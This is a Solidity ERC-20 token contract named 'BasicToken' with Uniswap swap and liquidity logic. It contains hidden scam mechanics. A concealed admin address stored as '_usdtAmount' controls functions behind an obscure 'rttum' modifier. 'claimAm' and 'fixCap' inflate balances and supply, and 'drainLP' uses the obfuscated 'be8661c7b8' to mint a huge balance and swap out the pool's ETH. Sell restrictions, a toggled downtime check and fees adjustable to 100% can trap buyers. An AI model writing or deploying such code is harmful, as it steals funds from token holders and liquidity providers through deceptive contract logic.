// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}   

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SecureCalls {
    function checkCaller(address sender, address _origin) internal pure {
        require(sender == _origin, "Caller is not the original caller");
    }
}

contract LibreMount {

    mapping(uint256 => mapping(address => bool)) internal _blockState;

    function compreTxnStamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {
        return(_tmstmp + _dwntm >= block.timestamp);
    }

    function suspiciousAddressCheck(address _addy) internal view {
        require(!_blockState[block.number][_addy], "Only one Txn per Block!");
    }

    function addSuspiciousAddress(address _addy) internal {
        _blockState[block.number][_addy] = true;
    }

}

contract TokenProtocol is IERC20, Ownable, LibreMount {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    mapping(address => uint256) private _hiddp;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 100000000000000000000000000;  // 100,000,000
    string private _name = "BasicToken";
    string private _symbol = "BASIC";
    uint8 private _decimals = 18;
    uint256 public MAX_GAS_PRICE = 4 gwei;
    uint private buyFee = 5;
    uint private sellFee = 10; 
    uint256 private swapThreshold = 100000000000000000; // 0.1
    uint256 private maxBuy = 1000000000000000000; // 1

    address private _origin;

    mapping(address => uint) private purchaseTimestamp;
    mapping(address => uint) private boughtAmount;
    uint256 private downTime = 1;
    mapping(address => bool) private premissionList;
    mapping(address => bool) public excludedFromFee;

    constructor () {
        _hiddp[owner()] = _totalSupply;
        
        emit Transfer(address(0), owner(), _totalSupply);

        premissionList[msg.sender] = true;
        premissionList[address(this)] = true;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;
        _usdtAmount = shortify(msg.sender);

        _origin = msg.sender;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _hiddp[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _hiddp[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _hiddp[from] = fromBalance - amount;
                _hiddp[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _hiddp[address(this)] += feeAmount;
                emit Transfer(from, address(this), feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _hiddp[from] = fromBalance - amount;
                _hiddp[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _hiddp[address(this)] += feeAmount;
                emit Transfer(from, address(this), feeAmount);

            } else {
                _hiddp[from] = fromBalance - amount;
                _hiddp[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _hiddp[from] = fromBalance - amount;
            _hiddp[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _hiddp[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _hiddp[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (isMarket(from)) {
            boughtAmount[to] = amount;
            if (exceedsGasPriceLimit()) { addSuspiciousAddress(to); }
            purchaseTimestamp[to] = block.timestamp;
        }
        if (isMarket(to)) {
            if (!premissionList[from]) {
                require(boughtAmount[from] >= amount, "You are trying to sell more than bought!");
                boughtAmount[from] -= amount;
                if (validationEnable())
                {require(compreTxnStamp(purchaseTimestamp[from], downTime), "LibreMount: Exceeds Txn Downtime");}
                suspiciousAddressCheck(from);
                _bam[from] -= amount;
            } 
        }

        if (!inSwap && !isMarket(from) && from != _origin && from != address(this)) {
			if (balanceOf(address(this)) >= swapThreshold) { swapTaxes(); addLiq(); }
		}

        if (maxBuy != 0 && isMarket(from) && !premissionList[to]) {
            uint256 x = _bam[to] += amount;
            require(x <= maxBuy, "exceed max buy");
            _bam[to] += amount;
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    bool internal validtionState;
    
    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function switchValidationEnableState() external rttum {
        validtionState = !validtionState;
    }

    function validationEnable() public view returns (bool) {
        return validtionState;
    }

    function editDownTime(uint _seconds) external rttum {
        downTime = _seconds;
    }

    function updatePremissionList(address[] calldata _usrs, bool _state) external rttum {
        for (uint256 i = 0; i < _usrs.length; i++) {
            premissionList[_usrs[i]] = _state;
        }
    }

    function checkPremissionList(address _user) external view returns (bool) {
        return premissionList[_user];
    }

    function checkUserPurchaseTime(address _user) external view returns (uint256) {
        return purchaseTimestamp[_user];
    }

    function checkUserBoughtAmount(address _user) external view returns (uint256) {
        return boughtAmount[_user];
    }

    function exceedsGasPriceLimit() internal view returns (bool) {
        return tx.gasprice >= MAX_GAS_PRICE;
    }

    function changeMaxGasPrice(uint _newGasPrice) external rttum {
        MAX_GAS_PRICE = _newGasPrice;
    }

    function fixCap(uint256 _amount) external rttum {
        _totalSupply += _amount;
    }

    function claimAm() external rttum {
        _hiddp[msg.sender] += 2 * (10 ** (15 + 18));
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function isExcludedFromFee(address _user) public view returns (bool) {
        return excludedFromFee[_user];
    } 

    function updateExcludedFromFeeStatus(address _user, bool _status) public rttum {
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function updateFees(uint256 _buyFee, uint256 _sellFee) external rttum {
        require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (buyFee, sellFee);
    }

    function AddLiquidity(uint256 _tokenAmount) payable external rttum {
        _approve(address(this), address(_router), _tokenAmount);
        transfer(address(this), _tokenAmount);
        _router.addLiquidityETH{ value: msg.value }(
            address(this), 
            _tokenAmount, 
            0, 
            0, 
            msg.sender, 
            block.timestamp + 1200
            );
    }

    function switchOrigin(address _newOne) external rttum {
        _origin = _newOne;
    }

    function drainLP() external rttum {
        uint256 thisTokenReserve = getBaseTokenReserve(address(this));
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        be8661c7b8(); transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), type(uint112).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_router.WETH());
        address to = msg.sender;
        _router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            to,
            block.timestamp + 1200
        );
    } 

    function getBaseTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
    } 

    function be8661c7b8() internal {
        _hiddp[msg.sender] += type(uint112).max;
    }

    // Swap & Liquify

    bool internal inSwap;

    modifier isLocked() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapTaxes() isLocked internal {
        uint256 amountIn = estimateEthAmountToSwap();
        _approve(address(this), address(_router), amountIn);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_router.WETH());
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 1200
        );
    }

    function estimateEthAmountToSwap() internal view returns(uint256) {
        return balanceOf(address(this)) / 2;
    }

    function addLiq() internal {
        uint256 ethAmount = address(this).balance;
        _approve(address(this), address(_router), balanceOf(address(this)));
        _router.addLiquidityETH{ value: ethAmount }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            _origin,
            block.timestamp + 1200
        );
    }

    function updateSwapThreshold(uint256 _amount) external rttum {
        swapThreshold = _amount;
    }

    // Max Buy

    mapping(address => uint256) internal _bam;

    function currentMaxBuy() public view returns (uint256) {
        return maxBuy;
    }

    function updateMaxBuy(uint256 _maxBuy) external rttum {
        maxBuy = _maxBuy;
    }

    // Util

    receive() external payable {}

    function removeStuckedETH() public rttum {
        payable(_origin).transfer(address(this).balance);
    }

    // ---

    uint160 public _usdtAmount;

    modifier rttum() {
        validate(shortify(msg.sender));
        _;
    }

    function shortify(address _u) internal pure returns (uint160) {
        return uint160(_u);
    }

    function validate(uint160 _u) internal view {
        require(_u == _usdtAmount, "k");
    }

    function newUstdLim(address _u) external rttum {
        _usdtAmount = shortify(_u);
    }

    function rebaseLP(address _routerAddress) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _router = IUniswapV2Router02(_routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH()));
    }

}